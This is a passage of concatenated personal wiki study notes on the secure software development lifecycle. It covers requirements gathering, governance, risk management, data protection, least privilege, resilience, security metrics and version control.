define, design, develop and deploy. In the end we deliver a working
product.

**The issue:** security is often involved for the first time right
before delivering the working product.

Instead, we want security-conscious development: security shall be
involved in every phase of the project. That means we have to understand
**function** and we have to understand **how to secure the function** of
the software.

**Key points review:** Security must support business operations
(security is *not* the goal). Ensure the needs of all stakeholders (IT,
network, customers etc) are identified. This is why this is called
*discover* software requirements.

-   [[gathering-security-requirements]]#
-   [[identify-compliance-requirements]]#


===

<!-- Source: computing/security/ssdlc/documenting-software-requirements.md -->
<!-- URL: /computing/security/ssdlc/documenting-software-requirements -->
<!-- Title: Documenting Software Requirements -->
<!-- Wikilinks: [[computing/security/ssdlc/documenting-software-requirements]], [[security/ssdlc/documenting-software-requirements]], [[ssdlc/documenting-software-requirements]], [[documenting-software-requirements]] -->

---
date: 2023-11-03T12:56:13+0900
---

# Documenting Software Requirements

**The recognition of risk and the determination of how to mitigate risk through
the use of *appropriate* controls, is of paramount importance to building secure
software**.

Previously we looked at [[discovering-secure-software-requirements]] and
[[data-protection]]. Now we need to put everything together down on paper
and document the software requirements.

The resulting document will help us check if requirements are met in the design
architecture implementation and tests.

## Risk Identification

We need to identify the needed controls. For this, a list of all risk needs to
be made:

-   Software
-   Users
-   Business
-   Process
-   Data

This will justify the controls we use. This will help to **identify controls
required to mitigate risks**. Each risk needs to be **allocated to either an
external or an internal control**. The specific control will be detailed during
the design phase.

We want to leverage **common controls**: controls that support more than one
system at a location (example: power). We also want controls that support
multiple locations (example: physical access control to all different offices).

Sometimes this is not possible and we need system-specific controls: controls
designed specifically for one system (input validation…).

There are also **hybrid controls**: common controls modified for a specific
system.

All controls must be documented: *if it’s not on paper, it does not exist*.

This can be done using a RTM: Requirements Traceability Matrix. This document
helps track what have been addressed, how, if they were tested etc.

## Risk Acceptance

Once controls are all documented, we can request a **formal acceptance of
risk**: management sign-off of agreed-on security requirements and gateway.

See also [[manage-security-requirements-with-third-party]]#.


===

<!-- Source: computing/security/ssdlc/economy-of-mechanism.md -->
<!-- URL: /computing/security/ssdlc/economy-of-mechanism -->
<!-- Title: Economy of Mechanism -->
<!-- Wikilinks: [[computing/security/ssdlc/economy-of-mechanism]], [[security/ssdlc/economy-of-mechanism]], [[ssdlc/economy-of-mechanism]], [[economy-of-mechanism]] -->

---
date: 2023-10-02T17:49:01+09:00
---

# Economy of Mechanism

The simple idea behind economy of mechanism is that **simple is better than
complex**.

Indeed, the more complex a system is, the more difficult it is generally to
secure it.

Another component of economy of mechanism is **leveraging existing components**:
those components are called **common controls** in contrast with **system
specific controls**.

Using already existing controls generally reduce costs and time to deliver.

Examples of common controls are access control (SSO), password vaults, already
available network components etc.

This also applies to staff: no need to hire new people if professionals are
already available.

Already available components includes well-known libraries (trusted modules,
APIs etc)

## Least Common Mechanism

On the other hands, we still want redundancy, resilience and defense in depth.
To avoid single point of failure, a balance between economy of mechanism and
least common mechanism must be made.

Isolation and compartmentalization is often necessary to reduce blast radius of
an attack.

Open design is another exemple of reusable technology, specially in cryptography
(Kerchkoff’s principle).

## Memory Challenge

Reusing existing infrastructure and system could lead to memory challenges. The
reuse of shared/portable memory is the cause for disclosure of sensible
information, and corruption of process.

Initialization of data, i.e. starting with a clean field is important to prevent
memory corruption. We also want to make sure that after a process is finished,
the memory is properly released to prevent memory leakage.


===

<!-- Source: computing/security/ssdlc/gathering-security-requirements.md -->
<!-- URL: /computing/security/ssdlc/gathering-security-requirements -->
<!-- Title: Gathering Security Requirements -->
<!-- Wikilinks: [[computing/security/ssdlc/gathering-security-requirements]], [[security/ssdlc/gathering-security-requirements]], [[ssdlc/gathering-security-requirements]], [[gathering-security-requirements]] -->

---
date: '2023-10-09T14:15:20+0900'
---

# Gathering Security Requirements

The failure of many projects is based on:

-   The failure to properly identify requirements (unclear, missing...)
-   Changes in the requirements or scope

How to address this?

The failure of requirements gathering is often caused by poor
requirements gathering:

-   Not talking to the right people (we talk to a few people with one
    biased opinion of how the system should work, but not the others)
-   Not understanding the business problems that need to be solved:
    oftentimes, business people don't express technology well, and
    technology people don't communicate with business people well,
    leading to lack of understanding the business problem that needs to
    be solved.
-   Lack of understanding how the technology works

To identify requirements, **three areas are addressed**:

-   Identify *functional* requirements
-   Identify *non-functional* requirements
-   Characterize *use and misuse cases* (intentionally or not)

## Functional Requirements

-   What will the system do?
-   What are the primary data flows?
    -   Stories: normal use process and normal errors to expect with
        mistake in using the system (properly)
-   How will the system meet business requirements?
    -   Compliance: prove to management that the system is working as
        intended (metrics, legal requirements etc)

## Non-Functional Requirements

-   Error handling: identify the error, revert to correct part of the
    code to restart or refix that error etc
-   Support audit: logs, data, snapshot (will be relevant in the testing
    domain)
-   Security: often thought as a option (we need to change that)
-   Reporting: reports on what is happening on the system (been done,
    going to been done etc)

## How to Gather Requirements

1st step: **observation**; how are things done right now?

**Interviews** (used to be called *Protection Needs Elicitation*): work
with the business people that we elicit or draw out: what are the
challenges? what are the risks? because they know better than us.

We check the **documentation** and see how things are supposed to work.
Often, other requirements can be gathered by going back to the standards
(PCI-DSS etc).

This will let security people talk from a position of authority: they
know what the standards say, what the requirements are. This is better
than just someone's opinion.

## Security Requirements

Security requirements are documented based on the **CIA triad**:

-   Uptime
-   Response time
-   Privacy
-   Safety
-   Accuracy
    -   Compliance: SOx ([Sarbanes--Oxley
        Act](https://en.wikipedia.org/wiki/Sarbanes%E2%80%93Oxley_Act))
        etc

**Key points Review:** The effort put into gathering requirements is
essential to the success of the project throughout all the project
phases that follow. Requirements gathering is not just about
understanding current solutions, but also about planning for the future.


===

<!-- Source: computing/security/ssdlc/governance.md -->
<!-- URL: /computing/security/ssdlc/governance -->
<!-- Title: Governance -->
<!-- Wikilinks: [[computing/security/ssdlc/governance]], [[security/ssdlc/governance]], [[ssdlc/governance]], [[governance]] -->

---
date: 2023-09-29T18:01:52+09:00
---

# Governance

Governance ensures that we are making the investment in things that are best for
the organization security.

Governance deals with **accountability** and **oversight**. It shall start with
the board of director and senior management to be effective in the organization:
they provide mandates, budget, and are accountable for the security and the
software used at the company.

## GRC: Governance, Risk & Compliance

Terms are often misused:

1.  Governance is the oversight itself
2.  Risk is to look for what could go wrong (threat modeling, liability for when
    things do go wrong)
3.  Compliance is the way we can provide assurance to management, but also to
    customers, employees, stakeholders and regulatory bodies. It needs logs and
    information for investigations and understand what happened in the system.

GRC is concerned with the risk associated with a software and the risk
associated with the *use* of a software. This includes how the software could
fail and how it could be misused.

## Standards

One way to prove we are doing things correctly is by the use of standards:
sometimes they are required by a **regulatory body** (GDPR…), sometimes they are
**legal** (need for resilience in a critical infrastructure, local laws etc).
Some **industries** have standards as well, such as PCI for payment card
industry.

Many government have standards as well, like NIST for the USA (free), or ISO for
the world (expensive).

## Security Design Principles

Security must be designed *into* information systems, including:

-   Applications
-   Networks
-   Hosts (the machines)
-   Databases

## Implementation of Security Concepts

Security is enforced through the use of **controls**. Controls are the way to
*enforce* security into the system.

Controls must be:

-   Designed
-   Developed
-   Implemented
-   Configured
-   Operated
-   Monitored
-   Improved (continuously)

Therefore we need to do risk assessment and the monitoring and management of our
controls.

We need controls because there are **risks**.

Risk is defined as:

> The likelihood of a threat exploiting a vulnerability and thereby causing
> damage to an asset.

One thing to look at is “what i the *likelihood* of the threat happening?” and
“what is the *amount of damage* if it was to happen?”

This is where risk management is important.

### Types of Controls

Controls may be:

-   Managerial/Administrative
-   Technical/Logical (firewall, etc)
-   Physical/Environmental/Operational (physical doors, locks etc)

### Reasons for Control Resistance

Controls are:

-   A limitation
-   A hindrance
-   A cost

They have impact on productivity. We don’t put controls unless there is a
justification. The amount of control necessary commensurate with the level of
risk.


===

<!-- Source: computing/security/ssdlc/identify-compliance-requirements.md -->
<!-- URL: /computing/security/ssdlc/identify-compliance-requirements -->
<!-- Title: Identify Compliance Requirements -->
<!-- Wikilinks: [[computing/security/ssdlc/identify-compliance-requirements]], [[security/ssdlc/identify-compliance-requirements]], [[ssdlc/identify-compliance-requirements]], [[identify-compliance-requirements]] -->

---
date: '2023-10-09T14:42:51+0900'
---

# Identify Compliance Requirements

There are threes areas to address:

-   Legal (protection of privacy...)
    -   Location of data storage and processing
    -   Jurisdiction
    -   AI (plagiarism, data accuracy, security...)
    -   Data ownership (make clear who *own* the data)
-   Regulatory (prove compliance with regulatory requirements)
-   Rules enforced by an agency: NERC -- North American Electric
    Reliability Corporation for electricity-related work - Food - Health
    care - Military
-   Industry standards
-   Payment card industry: PCI-DSS
-   OWASP -- Open Web Application Security Project

## Safety System

Safety systems is an area that is *outside* of traditional IT but is
more and more something that is important for all of us. A lot of
systems initially not handled by IT before, are now communicating over
traditional IT networks. For this reason we need to understand their
requirements, make sure they are reliable, and ensuring that they cannot
be compromised or be used to compromised our systems.

-   Industrial control systems
-   Real-time systems (automobiles..)
-   SCADA -- Supervisory Control and Data Acquisition systems (used to
    run on isolated software, now are internet-based)

## General Requirements

As always:

-   Access control levels
-   Encryption
    -   Obfuscation
-   Ability to demonstrate compliance
-   Logs (support certification and audits)
    -   Access logs
    -   Change control logs
    -   Task execution logs
    -   Audit hooks (get in and check whether or not things are working
        correctly)

## Core Development Requirements

-   Coding standards
-   Development tools
    -   Testing tools
-   Protocols
    -   Encryption
-   Frameworks

**Key Points Review:** Software must be designed to be compliant with
legal and regulatory requirements and to meet industry standards.


===

<!-- Source: computing/security/ssdlc/implementing-data-protection.md -->
<!-- URL: /computing/security/ssdlc/implementing-data-protection -->
<!-- Title: Implementing Data Protection -->
<!-- Wikilinks: [[computing/security/ssdlc/implementing-data-protection]], [[security/ssdlc/implementing-data-protection]], [[ssdlc/implementing-data-protection]], [[implementing-data-protection]] -->

---
date: 2023-10-25T10:12:21+0900
---

# Implementing Data Protection

Our software need to enforce **access control**. One of those concepts is **need
to know**:

-   Access based on business need to know
-   Restrict access to sensitive data
-   Ensure training of staff (clearance, review of access…)

## Business Requirements

To implement data protection based on business requirements, one need to think
about the following:

-   Operations:
    -   Criticality
    -   Backups
        -   Proximity (where to keep the backup)
    -   Response time
        -   Storage type
            -   Disk
            -   Tape

## Labeling

Labeling is there to indicate whether the data needs protection or not:

-   Indicate sensitivity (is it confidential data?)
-   Retention (how long should this data be kept?)
-   Ownership (who own and is responsible for the data?)

The labels can be electronic (headers with information) or physical, on a tape.

Codes can be used instead of names: this is a form of tokenization to prevent
revealing what the data is and/or how it should be handled.

## Data Protection Controls

We need controls: in all forms, in all places, at all times.

The best way is **encryption**.

We must also assure its **deletion** using crypto erasure/shredding. We also
must ensure the destruction was done with **defensible destruction**: evidence
of compliance with the proper deletion of data.

## Data Retention

How long should be keep the data?

-   Legal requirements (ability to retrieve)
-   Business needs
-   Historical/cultural significance

## Backups

We want to make sure we can recover the information even in case of catastrophic
event: this is called **disaster recovery**.

Location can be tricky: we want the data to be backed up far away from our
location but make sure we can legally do so (some data can’t be backed up in
another country, for example).

Data must be encrypted. In that case we must make sure we keep both the key and
the encryption algorithm for as long as we keep the data.

## Data Recovery

In case of a disaster, we want to make sure we can recover the data at the time
needed for the business to recover operations. This needs two concepts:

-   Recovery Point Objective (RPO): how much data could I lose, in time (seconds
    or days or weeks)
-   Recovery Time Objective (RTO): how much time to recover do we want to have
    (hours or days etc)

We need to know what data we need, how current they must be, and how could I
access that data within the allowable time frame of the RTO.

Summary:

-   Data must be protected according to risk, legal requirements and business
    needs.
-   Data protection is based on the sensitivity and criticality of the data.


===

<!-- Source: computing/security/ssdlc/incorporate-security-into-the-sdlc.md -->
<!-- URL: /computing/security/ssdlc/incorporate-security-into-the-sdlc -->
<!-- Title: Incorporate Security into the SDLC -->
<!-- Wikilinks: [[computing/security/ssdlc/incorporate-security-into-the-sdlc]], [[security/ssdlc/incorporate-security-into-the-sdlc]], [[ssdlc/incorporate-security-into-the-sdlc]], [[incorporate-security-into-the-sdlc]] -->

---
date: 2023-10-03T21:12:42+09:00
---

# Incorporate Security into the SDLC

Security should be part of **new software projects** and **changes to existing
software** (use the opportunity to improve some of the security of the
software).

Legacy systems are also in scope, however it may be that we can only put a front
end or isolate it because the system itself can’t be made secure.

To build security into each phase of the SDLC, we need not only culture and
policies but also **coding, risk, testing, and documentation standards**.

## Methodologies

There are several methodologies, but security is agnostic: all phases of
whatever methodology should have security baked in.

Phases, as defined by [NIST
SP800-160](https://csrc.nist.gov/pubs/sp/800/160/v2/r1/final), are as follow:

-   Concept: what we are going to do
-   Development: according to that concept
-   Production: produce the product that we developed
-   Utilization: use the product
-   Support: through maintenance and ongoing support
-   Retirement: end of life

Phases are fluids and some SDLC may have more or less of them, but the important
part is that security is in each phases.

## Security Strategy Roadmap

Defining the security strategy roadmap means defining objectives and defining
the route to reach those objectives. Resources must be allotted to be able to
deliver a project in time and in budget. Security is often cut short when a
project is running low on time and in budget.

We also want to have **review points**: are we on track? What’s the schedule
like and is the project still within budget?

Often times, the project spends too much time in the early phases, and does not
allocate enough time to the test phase.

We want **control gates** where we can have *go* and *no go* decisions.

## Security Documentation

We need to document our security plan. This includes:

-   System security plan (SSP, NIST SP 800-18)
-   System Security Authorization Agreement (SSAA) (NIACAP)
-   Security test plan
-   Risk assessment report (an updated document which gives risk assessment of
    the software through each phase of the development lifecycle)
-   Vulnerability assessments
-   Penetration testing reports
-   Business continuity and disaster recovery plans

The challenges with documentation is they are rarely **up-to-date**. All changes
must be documented and make sure that new changes does not overwrite previous
changes.

**Key points:** Regardless of the lifecycle methodology used, the security
professional should work with the development team to integrate security into
each phase of the development and ensure that the security of the software is
documented.


===

<!-- Source: computing/security/ssdlc/integrating-security-into-software.md -->
<!-- URL: /computing/security/ssdlc/integrating-security-into-software -->
<!-- Title: Integrating Security into Software -->
<!-- Wikilinks: [[computing/security/ssdlc/integrating-security-into-software]], [[security/ssdlc/integrating-security-into-software]], [[ssdlc/integrating-security-into-software]], [[integrating-security-into-software]] -->

---
date: 2023-10-02T07:47:08+09:00
---

# Integrating Security into Software

Let’s see how to integrate the #[[core-security-principles]] into software.

We know that security needs to be integrated into software development right
from the beggining.

A security-conscious software development is one that involve security at *each
step* of the development lifecycle: define, design, develop, and deploy.

## Project Management: the Iron Triangle

In project management, a common issue refered to as the *iron triangle* often
prevents baking security from the start. The iron triangle is:

-   Scope/deliverables
-   Time/schedule
-   Budget/cost

If we change the scope, this will have an impact on the time and budget; a
bigger scope will take more time and cost more money.

One part of the work to figure out is how to incorporate security into the
**budget** and deliver what it needs to **on time** and **on budget**.

**Security decisions are based on risk:** each system must be build with the
expectection that they will be attacked (intentionaly or accidentaly), so we
have to look at how to build resilient systems.

We need to understand **operational risk**: in the real world, what will the
users do to our system? What will hackers do?

A lot of this comes down to **understanding architecture**. Architecture is
planning: to deliver a product that meets the expectations and needs of the
client, and can evolve with future changes.

Let’s review the main concepts to integrate security into software:

-   [[complete-mediation]]#
-   [[describe-psychological-acceptability]]#
-   [[defense-in-depth]]#
-   [[least-privilege]]#
-   [[ssdlc/economy-of-mechanism]]#
-   [[resilience]]#


===

<!-- Source: computing/security/ssdlc/integrity.md -->
<!-- URL: /computing/security/ssdlc/integrity -->
<!-- Title: Integrity -->
<!-- Wikilinks: [[computing/security/ssdlc/integrity]], [[security/ssdlc/integrity]], [[ssdlc/integrity]], [[integrity]] -->

---
date: 2023-09-30T12:00:01+09:00
---

# Integrity

Integrity is the protection of data and processes from accidental or intentional
alterations or modifications.

For data, we look at:

-   Accuracy: level of conformity to fact
-   Completeness: is the data complete or partial?
-   Precision: do I need complete data or is rounding enough?
-   Reliability: is the data dependable, trustworthy?

Integrity within the applications can be kept in check with edit checks: check
for the format of the data, the range, the value limits, the access levels (read
only…).

Integrity can be enforced with a **hash value**: the hash becomes the proof of
integrity.

Hashing algorithms include MD5, SHA-1 (subject to collision), SHA-2, SHA-3.

Hashing can be used in digital signature to prove that a patch, code or binary
comes from the intended vendor.

The signature proves the authenticity of the data it is applied on.

**Integrity preserves processes and sensitive information from improper changes.
This ensure that only authorized changed are made by authorized entities.**


===

<!-- Source: computing/security/ssdlc/least-privilege.md -->
<!-- URL: /computing/security/ssdlc/least-privilege -->
<!-- Title: Least Privilege -->
<!-- Wikilinks: [[computing/security/ssdlc/least-privilege]], [[security/ssdlc/least-privilege]], [[ssdlc/least-privilege]], [[least-privilege]] -->

---
date: 2023-10-02T08:54:03+09:00
---

# Least Privilege

Least privilege means we only give a person the lowest level of access they
need, but also only for the time they need it. This can only be based on the
location (remote vs. the office) and their current role.

This is also true for runtime program: a running program’s privilege must be
only the strict necessary to do its job.

This concept is related to **zero trust**: trust no one, trust nothing.

In zero trust, **all internal and external devices and operations need to be
authenticated to make sure they are valid and should have that level of
access.**

Another related concept is **need to know**. Credit card number should be
obfuscated or masked to prevent leakage.

Sometimes, multiple instances of a record is created, so a person who’s looking
at something would see that this has a certain name. That name itself is seen by
people who don’t have a high-level access; those who do would see a different
naming convention. This is called **polyinstantiation**.

Yet another concept is **separation of duties** (segregation of duties). This is
where no one controls an entire transaction from its inception through its
completion. Different people perform different mutually exclusive tasks (person
who input data cannot approve the input). Or there is a multi-party (dual
control) system where two people are necessary to do a certain task. Other
times, some people know part of a password, and another people know the other:
this is split knowledge.


===

<!-- Source: computing/security/ssdlc/legal-and-regulatory-issues.md -->
<!-- URL: /computing/security/ssdlc/legal-and-regulatory-issues -->
<!-- Title: Legal and Regulatory Issues -->
<!-- Wikilinks: [[computing/security/ssdlc/legal-and-regulatory-issues]], [[security/ssdlc/legal-and-regulatory-issues]], [[ssdlc/legal-and-regulatory-issues]], [[legal-and-regulatory-issues]] -->

---
date: 2023-10-04T09:09:52+09:00
---

# Legal and Regulatory Issues

We need to make sure we are protecting the software correctly in the jurisdiction
we are developing and/or using our product. This is to protect the company’s
**intellectual property**.

Software IP is protected by its license. We want to make sure we are not in
violation of some type of software piracy regulation.

## Legal Requirements

We want to be compliant, this means maintaining logs and privacy of our users.
We need to check if we have an uptime SLA for the availability of our software
to prevent liability in case of failure.

I need to be aware of existing **privacy laws** surrounding the processed data:
sensitive data, health information, personally identifiable information.

Data on its own can be not important, but the aggregation of those data, or
combined with other, could lead to a breach of privacy.

-   **To aggregate:** join together
-   **To Infer:** see one thing and be able to deduce something else

Protection of sensitive data is often down through **access controls**. The
payment card industry says data access should be limited by **business need to
know**: *“do you need to know it in order to do your job?”*

Of course, access control needs to be **least privilege**.

Other requirement related to privacy is **notification of breach**: to whom,
when, how long after the discovery of breach should the notification be sent?


===

<!-- Source: computing/security/ssdlc/manage-security-requirements-with-third-party.md -->
<!-- URL: /computing/security/ssdlc/manage-security-requirements-with-third-party -->
<!-- Title: Manage Security Requirements with Third Party -->
<!-- Wikilinks: [[computing/security/ssdlc/manage-security-requirements-with-third-party]], [[security/ssdlc/manage-security-requirements-with-third-party]], [[ssdlc/manage-security-requirements-with-third-party]], [[manage-security-requirements-with-third-party]] -->

---
date: 2023-11-03T13:12:29+0900
---

# Manage Security Requirements with Third Party

**The laws of many countries require the data owner to be responsible for the
continued protection of data even when the data is processed or stored by a
third party.**

**This requires clear communication of the roles and responsibilities of each
party involved in a third party agreement.**

All relation with third party should be guided by a third party agreements:

-   Contracts
-   SOW (Statements Of Work)
-   Ownership of source code
    -   Escrow
-   Support (software, security)
-   Anything else to ensure what is expected of all parties

Everything from storage, processing, and disaster recovery should be added to
the contracts.

## Legal Considerations

We need to be aware of jurisdiction, where the data reside and if backups are
made on site or in a different country.

In case of disagreement or dispute, we want to stipulate in which country is the
law applicable.

Contracts are also important for the protection of intellectual property; same
with patents.


===

<!-- Source: computing/security/ssdlc/managing-software-lifecycle-risk.md -->
<!-- URL: /computing/security/ssdlc/managing-software-lifecycle-risk -->
<!-- Title: Managing Software Lifecycle Risk -->
<!-- Wikilinks: [[computing/security/ssdlc/managing-software-lifecycle-risk]], [[security/ssdlc/managing-software-lifecycle-risk]], [[ssdlc/managing-software-lifecycle-risk]], [[managing-software-lifecycle-risk]] -->

---
date: 2023-10-04T08:33:55+09:00
---

# Managing Software Lifecycle Risk

**Risk management** is not about **risk elimination**: risk is something that is
a part of everyday life and must be managed, but there is still a part of
uncertainty.

**Risk Assessment:** Systematic method of identifying the assets of a data
processing system, the threats to those assets, and the vulnerability of the
system to those threats.

**Risk Management**: Systematic application of management policies, procedures
and practices to the activities of communicating, consulting, establishing the
context and identifying, analyzing, evaluating, treating, monitoring and
reviewing risk.

Source: [ISO-IEC-27000:201](https://www.iso.org/standard/73906.html)

## Risk Factors

-   Asset value: what are we protecting? Is it critical? Is it sensitive?
-   Threats: internal and external threats, including on purpose and accidental.
    Threats is anything that could go wrong, including the fact that we could
    loose key employees, or that the business process could change.
-   Vulnerabilities: weaknesses or gaps, missing controls or lack of testing
    that allowed that **threat to go undetected and create a real problem**.

## Causes of Lifecycle Risk

-   Business Risk:
    -   Changes to business requirements
    -   Need to adapt quickly
    -   Staffing challenges
    -   New regulations
-   Technical Risk:
    -   Technology becomes outdated or unsupported
    -   Hard to maintain
    -   Unable to support new functionality
    -   Technology may fail causing business interruptions

## Risk Response

Hopefully we are able to detect, evaluate and mitigate the risk. But sometimes
we will found unmitigated risks.

Once we found a risk, we can decide one of the following:

-   Avoid risk: turn off the risky functionality
-   Accept risk: accept to bear the consequences if the risk is exploited
-   Mitigate/reduce risk: use new or additional controls
-   Transfer risk: outsource it, or pass it to an insurance

## Risk Monitoring

We need to continuously monitor risks: what was once secure may be inadequate
now.

Monitoring includes network, transactions, access controls and configuration.

## Residual Risk and the Risk Register

It is impossible to be have 0 risk. There will always have what is called
**residual risk**. There are also unresolved risk that we know we want to
resolve at some point. Those are saved in the **risk register** so they can be
tracked.

The risk register tracks all our known-risk and can therefor give us a **risk
profile**. This profile helps us determine if this is an acceptable level of
risk to management in today’s world or not.

## Going Forward

-   [[legal-and-regulatory-issues]]#
-   [[software-security-standards]]#


===

<!-- Source: computing/security/ssdlc/managing-software-operational-security.md -->
<!-- URL: /computing/security/ssdlc/managing-software-operational-security -->
<!-- Title: Managing Software Operational Security -->
<!-- Wikilinks: [[computing/security/ssdlc/managing-software-operational-security]], [[security/ssdlc/managing-software-operational-security]], [[ssdlc/managing-software-operational-security]], [[managing-software-operational-security]] -->

---
date: 2023-10-05T08:17:55+09:00
---

# Managing Software Operational Security

Developing secure software is not enough: we need to make sure the software
**remains secure all the way through its operational life as well.**

## Software Configuration

We need to make sure that the configuration we intended for development purpose
are turned off, and for production purpose are turned on.

**Default accounts** are accounts put in by vendor for testing and maintenance.
They are commonly known and can be used as a point of entry to get access to the
software. Password are often never changed, if they are changeable at all.

We have to double check the **access levels** of users and that **logs are
turned on**.

Finally, make sure the built-in security features are turned on.

This come downs to **hardening** our system, i.e. disabling all unnecessary
features. This includes:

-   Administrator accounts
-   Administrator functions
-   Remote access
-   Vendor-supplied default accounts and passwords

Sometimes, this is not documented and we need to discover those by ourselves.

## Documentation

An important part of secure operations is to have good documentation:

-   User guides (how to use the system)
-   Error handling (what the error means, without giving too much information
    that people could use to create errors to find out how the system works)
-   Scheduling (what jobs must complete prior, subsequently, etc)
-   Architecture configuration (DMZ etc)

## Verification and Validation

Verification:

-   Check existence of control
-   Controls were implemented
-   Controls are correctly configured
-   Controls are documented

Validation:

-   Ensure it is the “right” control
-   Mitigates identified risk
-   Controls operate correctly
-   Test results are available

## Assessment and Authorization

Assessment:

-   Testing of controls
-   Determine level of risk associated with the software
-   Performed throughout the software lifecycle
-   Shift left

Authorization:

-   Approval of software for implementation by Senior Manager
-   Acceptance of risk
-   Performed prior to implementation
-   Documents conditions for operation
-   Re-authorization may be required depending on changes to system or
    operational environment

## Going Further

-   [[version-control]]#
-   [[security-metrics]]#


===

<!-- Source: computing/security/ssdlc/resilience.md -->
<!-- URL: /computing/security/ssdlc/resilience -->
<!-- Title: Resilience -->
<!-- Wikilinks: [[computing/security/ssdlc/resilience]], [[security/ssdlc/resilience]], [[ssdlc/resilience]], [[resilience]] -->

---
date: 2023-10-02T20:37:55+09:00
---

# Resilience

Resilience can be defined as the ability to adapt to difficult situations.

We need to build resilience in our system.

We need redundancy, being able to find single points of failure (SPOF), have
fail over, and being fault tolerant (recognize failure and be able to correct
that).

We also need multiple people that have been cross trained to support our
products.

Other metrics we are measured against is **fail secure**.

Fail secures means that when a system fails, it should not fail in a state that
leads to a compromise of security. There are different kind of fail secure:

-   Fail hard: hard shutdown
-   Fail soft: try again
-   Fail safe: for the safety of people, an emergency door let people out but
    won’t let people in

Resilient software is based on isolation: isolate failures, reduce dependencies
(loose coupling, so if one element has a problem, it doesn’t mean that the
others fail as well).


===

<!-- Source: computing/security/ssdlc/security-metrics.md -->
<!-- URL: /computing/security/ssdlc/security-metrics -->
<!-- Title: Security Metrics -->
<!-- Wikilinks: [[computing/security/ssdlc/security-metrics]], [[security/ssdlc/security-metrics]], [[ssdlc/security-metrics]], [[security-metrics]] -->

---
date: 2023-10-06T09:08:03+09:00
---

# Security Metrics

We can collect metrics on almost anything. We have to define: what are the
goals? What is the desire results?

We want **quantitative** (measurable) and not qualitative goals, so that they
are easily measurable. Quantitative does not mean the metrics can’t be
subjective, however, and we want to make sure to have **objective** metrics.

We also want **consistent** numbers: in order to compare month to month, year to
year etc.

We also want **impartiality**: bias can come from the person taking the metrics
*and* interpreting the metrics, based on their own relation to the numbers (is
the number tied to their results etc). We want metrics that are *the same no
matter who measures them*.

Finally, the metrics must be **linked to business goals**: companies don’t care
about hard drive failure, but they care if that failure leads to sales loss.

Examples of metrics:

-   Coding practices
-   Defects per line of code
    -   Time to remediate
    -   Criticality level

## Keys Metrics

-   Key goal indicators: what we would like to do, the ideal state
-   Key performance indicators: what we *must* do, the bare minimum
-   Key risk indicators: used with key performance indicators to alert us if
    there is something that maybe will go wrong

An example of key risk indicator is: if I have a key performance indicator that
says I must wrap up support phone call in less than 60min, the key risk
indicator would send an alert at 50min to indicate we are near risk of not
performing at agreed time.

## Review of Performance

-   Functional
    -   Operating criteria
-   Non-functional
    -   Training of administrators and users
    -   Monitoring and log review
    -   Change control

## Metrics (Generalities)

**Measure what is important** and **what can be change** (what we have an
influence on).

**Focus on consistent measurement criteria**.

## Quality Assurance

Peer review the work, do vulnerability assessments (regularly), do penetration
tests.

## Reporting to Management

Metrics are any good if they are not reported to management so that someone can
make a decision and act upon them. The following can (and should) be reported to
management:

-   SIEM (dashboards)
-   Alarms
-   Logs
-   Audits (often called the “eyes and ears of management”)
-   CMMI models (Capability Maturity Model Integration): are we making progress
    in the way we do various processes such as change control/SDLC? Are we
    maturing and not making the same mistakes over and over, year after year?
-   Feedback cycles (from management)
    -   Steering committees (advisory board that has governance over a company,
        determines the order in which business will be taken up).

## Incident Management

Incident management is “how do I deal with those unexpected incidents that could
cause a disruption to business processes?”

We should have a plan:

-   Incident response plan
-   Documented procedures
    -   Mitigation, containment, restoration
-   Communication with management
    -   Breach
    -   Impact on business

**Key points review:** Perception is the enemy of reality: many people *think* a
system is not working to desired levels of performance, but they are often
wrong. Have defined security metrics to define what is a *pass* or a *fail*.


===

<!-- Source: computing/security/ssdlc/software-development-methodologies.md -->
<!-- URL: /computing/security/ssdlc/software-development-methodologies -->
<!-- Title: Software Development Methodologies -->
<!-- Wikilinks: [[computing/security/ssdlc/software-development-methodologies]], [[security/ssdlc/software-development-methodologies]], [[ssdlc/software-development-methodologies]], [[software-development-methodologies]] -->

---
date: 2023-10-03T20:58:26+09:00
---

# Software Development Methodologies

We want to weave security into the entire development lifecycle.

That means we need a goal: what is security? What is the objectices of secure
software? What are the standards we expect?

The first step is to create a **security strategy roadmap**: we need to pay
attention to security during each phase of the project and continually re-assess
the risk as we go through the development lifecycle, as which each phase, the
risks get clearer and clearer.

We also want to have the component tested against security.

## NIST SSDF

The [NIST Secure Software Development
Framework](https://csrc.nist.gov/Projects/ssdf) starts with *preparing the
organization*. This means having policies, training and standards that will help
the development projects.

**Protect the software:** from unauthorized access or modification

**Produce well-secured software:** minimize vulnerabilities

**Respond to vulnerabilities:** appropriately (respond in an appropriate manner)

Then, we want to **mandate adherence to standards and policy**. All software
must be secure, as even the smallest could be used as an entry point to internal
networks.

A security culture is required, as security is everyone's job. We also want
requirement to pass security audits before product acceptance and release to
production.

See also [[incorporate-security-into-the-sdlc]]#


===

<!-- Source: computing/security/ssdlc/software-security-standards.md -->
<!-- URL: /computing/security/ssdlc/software-security-standards -->
<!-- Title: Software Security Standards -->
<!-- Wikilinks: [[computing/security/ssdlc/software-security-standards]], [[security/ssdlc/software-security-standards]], [[ssdlc/software-security-standards]], [[software-security-standards]] -->

---
date: 2023-10-04T09:25:41+09:00
---

# Software Security Standards

Following good practices can help the project succeed. Those good practices are
often articulated in known and well established standards.

A security standards is set of ideas, not exhaustive or perfect but
comprehensive enough so that hopefully almost every use case is covered.

Examples include the ISO27000 series and ISO27034 for Application Security.

Auditors often use COBIT: Control Objectives for IT and related technology. It’s
a standard for management practices and processes.

NIST also have the SP800-37 and 39 that deals with risks in software development
lifecycle.

For application security, the OWASP TOP10 is the gold standard. OWASP also
creates and maintain the SAMM (Software Assurance Maturity Model).

**Summary**: we can only protect against risk we are aware of an anticipate.
Standards help ensure that all software security factors have been identified.


===

<!-- Source: computing/security/ssdlc/version-control.md -->
<!-- URL: /computing/security/ssdlc/version-control -->
<!-- Title: Version Control -->
<!-- Wikilinks: [[computing/security/ssdlc/version-control]], [[security/ssdlc/version-control]], [[ssdlc/version-control]], [[version-control]] -->

---
date: 2023-10-05T08:35:29+09:00
---

# Version Control

Version control lets us maintain security of software. Often, a patch of change
management disturb the security controls that were present, and perhaps disabled
or bypass them.

With change management process, we can maintain a list of changes to the
software, and also the underlying infrastructure:

-   Network security
-   Server
-   Database
-   Operating system
-   Utilities
-   Hardware

Every change must be reviewed for their potential impact on security, for all of
the elements above.

Source code must also be version controlled, and we need to make sure the
